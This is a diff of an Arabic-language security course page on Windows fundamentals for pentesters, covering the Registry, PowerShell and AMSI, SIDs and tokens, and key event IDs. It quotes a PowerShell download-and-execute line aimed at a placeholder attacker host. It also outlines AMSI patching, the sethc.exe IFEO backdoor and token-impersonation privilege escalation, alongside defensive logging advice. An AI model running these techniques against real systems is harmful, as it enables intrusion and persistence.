@@ -6,10 +6,16 @@ export default function Page() {
     <LessonShell slug="windows-fundamentals">
       <L
         ar={<>
-          <Section title="لماذا Windows لمختصي الأمن">
-            <p>Windows يشغّل ~75% من حواسيب المؤسسات و معظم الـ Active Directory في العالم. كل APT تقريباً تستهدف Windows في مرحلة من الهجوم. فهم Windows من الداخل = نصف معركة الـ red و blue team.</p>
-            <Callout kind="info" title="الهدف">
-              فهم: Registry، PowerShell كأداة قوية، الخدمات والعمليات، أحداث الـ logs، و فكرة Active Directory المبدئية.
+          <Section title="ليه Windows مهم لو أنت Pentester؟">
+            <p>تعالى نسأل من الأساس.</p>
+            <p>إنت بتهاجم لينكس على HackTheBox من سنتين.. حلو.</p>
+            <p>طب أول engagement هتدخله في الواقع، هتلاقي إيه؟</p>
+            <p>هتلاقي 200 جهاز Windows.. كلهم مربوطين على Domain Controller.. والشغل الحقيقي مش على البورت 22، الشغل على 445 و389 و5985.</p>
+            <p>أعرف واحد — صديق ليا — قعد يتعلم Red Team سنة كاملة على لينكس. لما اتحط في أول AD lab، بقى على ادهم. مش لإنه عيّل، لإنه ما فهمش <span className="eng">Token</span> ولا <span className="eng">SID</span> ولا الـ Registry. كل هجوم Privesc بيعدي عليه زي اللغز. قعد يـ copy-paste من المدونات من غير ما يفهم بيحصل إيه.</p>
+            <p>Windows مش OS تاني. Windows عالم لوحده.</p>
+            <p>75% من أجهزة المؤسسات في الدنيا كلها.. ومعظم الـ Active Directory في الكوكب. أي APT بتاكل عيش بتدخل Windows في مرحلة من المراحل. لو ما فهمتش Windows من جوّه، إنت بتلعب بإيد واحدة.</p>
+            <Callout kind="info" title="اللي هنغطّيه">
+              الـ Registry وأماكن الـ persistence الحقيقية، PowerShell كسلاح (وقصة AMSI)، نموذج SID/Token، وأهم Event IDs اللي لازم تعرفها بظهر قلب، ومقدمة AD.
             </Callout>
           </Section>
 
@@ -29,8 +35,24 @@ export default function Page() {
 └── Recycle Bin`}</Code>
           </Section>
 
-          <Section title="PowerShell — الأداة الأقوى على Windows">
-            <p>PowerShell ليس &quot;cmd أحدث&quot;. هو لغة برمجة كاملة مع وصول لـ .NET. كل أداة pentest تقريباً على Windows مكتوبة بـ PowerShell.</p>
+          <Section title="PowerShell — السلاح الأهم.. وقصة AMSI">
+            <p>PowerShell مش &quot;cmd بنكهة جديدة&quot;.</p>
+            <p>دي لغة برمجة كاملة، بوصول مباشر لـ .NET، يعني عندك كل الـ Win32 API في إيدك. كل أداة pentest كبيرة على Windows اتكتبت بيها: Empire، PowerSploit، Nishang، PowerView. ولسة.</p>
+            <p>طب تعالى أحكيلك القصة الحقيقية.</p>
+            <p>قبل 2015، كان PowerShell جنة المهاجمين.</p>
+            <p><span className="eng">IEX (New-Object Net.WebClient).DownloadString(&apos;http://attacker/payload.ps1&apos;)</span> — سطر واحد، الـ payload نزل في الذاكرة، اشتغل، وما لمسش الديسك. الـ AV ساعتها كان أعمى. خالص.</p>
+            <p>كل Red Team operator عاش الفترة دي افتكر إنه عبقري. كان بيـ bypass كل حاجة بسطر بايثون.. آسف.. PowerShell.</p>
+            <p>وبعدين جت Microsoft بـ <span className="eng">AMSI</span> (Antimalware Scan Interface) في Windows 10.</p>
+            <p>الفكرة بسيطة وعبقرية: قبل ما PowerShell ينفّذ أي سكربت، بيبعت النص للـ AV scanner. ال AV بيقرا النص — مش الـ binary — ويقرر يسمح ولا لأ. حتى لو السكربت في الذاكرة بس، AMSI بيشوفه.</p>
+            <p>الـ Red Teamers اتلطشوا. وفجأة كل أدواتهم القديمة بطّلت تشتغل.</p>
+            <p>فبدأ سباق التسلّح:</p>
+            <ul>
+              <li><b>Obfuscation</b> — تكسير الكلمات اللي AMSI بيـ flag عليها (<span className="eng">Invoke-Mimikatz</span> بقت <span className="eng">In&apos;+&apos;voke-Mim&apos;+&apos;ikatz</span>).</li>
+              <li><b>AMSI Bypass</b> — patching الدالة <span className="eng">AmsiScanBuffer</span> في الذاكرة عشان ترجع &quot;clean&quot; دايماً.</li>
+              <li><b>Constrained Language Mode</b> — لو الـ Defender شدّاد، بيمنع .NET reflection أصلاً.</li>
+            </ul>
+            <p>الدرس هنا: PowerShell سلاح ذو حدّين. لو إنت Blue، فعّل <span className="eng">Script Block Logging</span> (Event 4104) و<span className="eng">Module Logging</span>. AMSI لوحده مش كفاية.</p>
+            <p>الواقع vs المفروض: المفروض كل المؤسسات مفعّلاها. الواقع.. أغلب الجهات اللي شفتها بتكتفي بـ &quot;Windows Defender شغّال&quot; وخلاص.</p>
             <Terminal lines={[
               { p: "Get-ChildItem C:\\\\Users      # ls المعادل" },
               { p: "Get-Process                     # العمليات" },
@@ -51,8 +73,9 @@ export default function Page() {
             ]} />
           </Section>
 
-          <Section title="Registry — قاعدة بيانات الإعدادات">
-            <p>Registry هو حيث Windows يخزّن كل إعداد. مفهومه:</p>
+          <Section title="Registry — قاعدة بيانات النظام كلها (وكنز الـ Persistence)">
+            <p>الـ Registry هو المكان اللي ويندوز بيكتب فيه كل إعداد. كل setting في النظام. كل برنامج. كل user.</p>
+            <p>اعتبره قاعدة بيانات الـ OS كاملة، مفتوحة قدامك، شغّالة في الذاكرة:</p>
             <Code lang="text">{`HKEY_LOCAL_MACHINE (HKLM)   ← إعدادات النظام كله
   └── SOFTWARE
   └── SYSTEM
@@ -71,9 +94,39 @@ HKEY_USERS (HKU)            ← كل المستخدمين`}</Code>
               { p: "# 2) UAC settings:" },
               { p: "Get-ItemProperty 'HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System'" },
             ]} />
-            <Callout kind="info" title="لماذا Run keys مهمة">
-              أكثر مكان يضع فيه malware نفسه ليعمل عند بدء التشغيل. <span className="eng">Sysinternals Autoruns</span> أداة الذهب لاستعراض كل أماكن الاستمرار دفعة واحدة.
+            <Callout kind="info" title="ليه الـ Run keys مهمة (والقصة الكاملة)">
+              <p>تعالى نمشي على أهم 3 أماكن persistence في الـ Registry — اللي بيستخدمها أي malware من زمان لحد APT41:</p>
+              <p><b>1) Run / RunOnce</b> — <span className="eng">HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span>. أي قيمة هنا = برنامج يشتغل لما الـ user يـ login. عبيط؟ آه. لسة شغّال؟ آه.</p>
+              <p><b>2) AppInit_DLLs</b> — <span className="eng">HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs</span>. أي DLL هنا بيتحقن في كل عملية بتـ load <span className="eng">user32.dll</span>. يعني تقريباً كل عملية GUI. مايكروسوفت قفلتها افتراضياً من Win8، بس لسة بتلاقيها مفتوحة في بيئات قديمة.</p>
+              <p><b>3) Image File Execution Options (IFEO)</b> — تقدر تخلّي أي EXE يشغّل EXE تاني. الـ trick القديم: تحط <span className="eng">Debugger=cmd.exe</span> تحت <span className="eng">sethc.exe</span>، وبعدين تضغط Shift خمس مرات في شاشة الـ login = SYSTEM shell.</p>
+              <p><b>اللي الـ Blue هيشوفه</b> — لو Sysmon مفعّل بـ config محترم (SwiftOnSecurity أو Olaf): Event ID 12/13/14 على أي تعديل في الـ Registry تحت المسارات دي. والـ Autoruns بيلملم الـ ~250 مكان persistence في شاشة واحدة. لو إنت DFIR ومش بتفتح Autoruns الأول، إنت بتعك.</p>
             </Callout>
+          </Section>
+
+          <Section title="نموذج الأمان — SID و Token (افهمها زي بطاقة المخابرات)">
+            <p>تعالى أوريك الفكرة بتشبيه بسيط.</p>
+            <p>تخيل المخابرات.</p>
+            <p>كل ضابط عنده <b>بطاقة هوية</b> فيها رقمه القومي + الفرع التابع له + الرتبة + الصلاحيات اللي يقدر يدخل بيها أوضة من الأوض. البطاقة دي هي اللي بتحدد يقدر يدخل فين، لا الاسم ولا الوش.</p>
+            <p>دي بالظبط الـ <b>Access Token</b> في Windows.</p>
+            <ul>
+              <li><b>SID (Security Identifier)</b> = الرقم القومي. شكله <span className="eng">S-1-5-21-...-1001</span>. ما بيتكررش، حتى لو حذفت اليوزر وعملت واحد بنفس الاسم — الـ SID الجديد هيبقى مختلف.</li>
+              <li><b>Token</b> = البطاقة كلها. فيها SID اليوزر + SIDs بتاعة كل المجموعات اللي هو فيها + الـ Privileges (زي <span className="eng">SeDebugPrivilege</span>، <span className="eng">SeImpersonatePrivilege</span>).</li>
+              <li><b>كل process</b> بيشتغل ومعاه token. الـ kernel بيقرر &quot;ينفع يفتح الملف ده ولا لأ&quot; بناءً على الـ token، مش بناءً على اسم اليوزر.</li>
+            </ul>
+            <p>ليه الكلام ده مهم لو إنت بتعمل privesc؟</p>
+            <p>لإن نص هجمات الـ Privilege Escalation على Windows مبنية على فكرة واحدة: <b>سرقة أو تعديل التوكن</b>.</p>
+            <ul>
+              <li><b>Token Impersonation</b> — لو معاك <span className="eng">SeImpersonatePrivilege</span> (وأغلب service accounts معاهم)، تقدر تـ impersonate توكن أي عملية تانية. ده أساس <span className="eng">Potato</span> بكل أنواعه (Hot/Rotten/Juicy/Rogue).</li>
+              <li><b>Pass-the-Token</b> — في AD، التوكن فيه TGT بتاع Kerberos. لو نسخته، إنت اليوزر ده.</li>
+              <li><b>UAC Bypass</b> — UAC مش security boundary حقيقي، ده &quot;split token&quot; بس. في كذا 30+ bypass موثّقة في <span className="eng">UACME</span>.</li>
+            </ul>
+            <p>لو ما فهمتش الـ Token model، هتفضل تنفّذ هجمات وأنت مش فاهم بتحصل ليه. ولما الـ Defender يقفل الباب الواضح، مش هتلاقي الباب التاني.</p>
+
+            <p>- طب ينفع أحفظ أوامر Mimikatz وخلاص؟؟</p>
+
+            <p>كنت مستنيك تسأل ده يا مستجد. متوقّع. آه ينفع — لمدة أسبوع، لحد ما الـ EDR يقفل الـ command line ده. اللي بيعرف Token model بيلف على 5 طرق تانية. اللي حافظ commands بيقعد يدوّر على blog post جديد.</p>
+
+            <p>اوعى تعتمد على أمر. اعتمد على الفهم.</p>
           </Section>
 
           <Section title="العمليات والخدمات">
@@ -147,8 +200,13 @@ HKEY_USERS (HKU)            ← كل المستخدمين`}</Code>
             ]} />
           </Section>
 
-          <Section title="السجلات (Event Logs)">
-            <p>Windows يسجل كل شيء في Event Viewer. كل event له ID — حفظ بعض IDs المهمة يفرّق المهاجم عن المدافع الجاد:</p>
+          <Section title="Event Logs — الأرقام اللي لازم تحفظها بظهر قلب">
+            <p>تعالى أحكيلك حكاية حصلت فعلاً.</p>
+            <p>محلل في SOC في جهة كبيرة — مش هقول مكان — كان عامل dashboard ظريف بيراقب فيه Event 4624 (تسجيل دخول ناجح). كل يوم بيبص على القايمة، يشوف &quot;كله تمام&quot;، ويقفل.</p>
+            <p>المهاجم دخل من حساب service account.. عمل psexec على 12 جهاز.. سرق hash الـ KRBTGT.. وعمل Golden Ticket.</p>
+            <p>الـ 4624 كانت كلها &quot;ناجحة&quot;. طبعاً ناجحة، هو ماشي بتذكرة Kerberos صحيحة. الدنيا كلها &quot;ناجحة&quot;.</p>
+            <p>اللي فاته: <b>4688</b> — process creation. كان هيشوف <span className="eng">cmd.exe</span> بتنشأ من <span className="eng">services.exe</span> على 12 جهاز خلال 4 دقايق. ده مش طبيعي.</p>
+            <p>الدرس: لو بتراقب 4624 لوحده، إنت مش بتراقب. إنت بتعد. خليني أديك القائمة اللي لازم تتبصمل عليها:</p>
             <Code lang="text">{`Security log:
   4624  ← تسجيل دخول ناجح
   4625  ← تسجيل دخول فاشل
@@ -187,10 +245,21 @@ PowerShell logs (إذا فُعّلت):
           <Section title="ممارسة">
             <ol>
               <li>افتح PowerShell على Windows VM، نفّذ كل أمر فوق.</li>
-              <li>حمّل Sysinternals Suite، شغّل Autoruns، انظر كم مكان يبدأ منه شيء.</li>
-              <li>في Event Viewer، ابحث عن آخر event 4624 — ستراك أنت.</li>
-              <li>ادرس <span className="eng">Get-Help</span> — مكافئ <span className="eng">man</span>: <span className="eng">Get-Help Get-Process -Examples</span>.</li>
+              <li>حمّل Sysinternals Suite، شغّل Autoruns، وشوف كم مكان النظام بيبدأ منه فعلاً.</li>
+              <li>في Event Viewer، دوّر على آخر 4624 — هتلاقي نفسك.</li>
+              <li>اقرأ <span className="eng">Get-Help</span> — مكافئ <span className="eng">man</span>: <span className="eng">Get-Help Get-Process -Examples</span>.</li>
+              <li>افتح <span className="eng">whoami /all</span>، وحاول تطابق كل SID مع المجموعة بتاعته. ده هيبقى مرجعك.</li>
             </ol>
+          </Section>
+
+          <Section title="الخلاصة الناشفة">
+            <p>Windows مش أصعب من لينكس.</p>
+            <p>هو بس مختلف.</p>
+            <p>لو فهمت الـ SID، والـ Token، والـ Registry — هتفهم كل هجوم تاني.</p>
+            <p>كل Privesc, كل persistence, كل lateral movement, كل AD attack بتيجي بعدين — كلها مبنية على نفس الأساس ده.</p>
+            <p>اللي بيحفظ أوامر من غير ما يفهم النموذج، بيقف عند أول جهاز ما يـ pop عليه shell. واللي فاهم النموذج، بيدخل على الجهاز ويعرف فوراً يدوّر فين.</p>
+            <p>اكتبها على كشكول الـ lab: SID + Token + Registry = نص Windows. الباقي تفاصيل.</p>
+            <p>كن من التانيين.</p>
           </Section>
         </>}
         en={<>
